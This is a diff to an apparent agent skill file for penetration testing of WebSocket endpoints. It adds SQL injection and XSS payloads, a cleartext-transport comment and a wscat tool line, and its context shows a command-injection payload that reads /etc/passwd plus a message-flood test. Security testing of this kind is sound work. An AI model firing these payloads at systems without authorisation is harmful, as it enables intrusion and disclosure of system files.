@@ -2,6 +2,8 @@
 name: attack-websocket
 description: Apply when an application exposes a WebSocket endpoint, to test its origin validation, authentication, and message handling for hijacking or injection flaws.
 metadata:
+  acordia:
+    family: web-attack
   cyberstrike:
     source: .cyberstrike/skill/attack-websocket/SKILL.md
     commit: 359655518
@@ -29,6 +31,9 @@ for path in /ws /socket /websocket /api/ws /chat /live /realtime; do
     -H "Sec-WebSocket-Version: 13" \
     -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" 2>/dev/null | head -1
 done
+
+# Cleartext transport — an endpoint served over ws:// rather than wss:// exposes
+# messages, tokens and session cookies on the wire
 ```
 
 ### Phase 2: Cross-Site WebSocket Hijacking (CSWSH)
@@ -77,6 +82,12 @@ websocat "wss://TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'
 # XSS via WebSocket message (if rendered in other clients)
 websocat "wss://TARGET/ws" <<< '{"action":"chat","message":"<img src=x onerror=alert(1)>"}'
 
+# SQL injection in a message parameter
+websocat "wss://TARGET/ws" <<< '{"action":"getUser","id":"1 OR 1=1"}'
+
+# XSS in a message rendered by other clients
+websocat "wss://TARGET/ws" <<< '{"msg":"<script>alert(1)</script>"}'
+
 # Command injection
 websocat "wss://TARGET/ws" <<< '{"action":"exec","cmd":"id; cat /etc/passwd"}'
 ```
@@ -113,6 +124,7 @@ python3 -c "print('{\"data\":\"' + 'A'*1000000 + '\"}')" | websocat "wss://TARGE
 ## Tools
 
 - `websocat` (external) — WebSocket CLI client
+- `wscat -c wss://TARGET/ws` (external, npm) — alternative WebSocket CLI client
 - Browser DevTools → Network → WS tab
 
 ## References
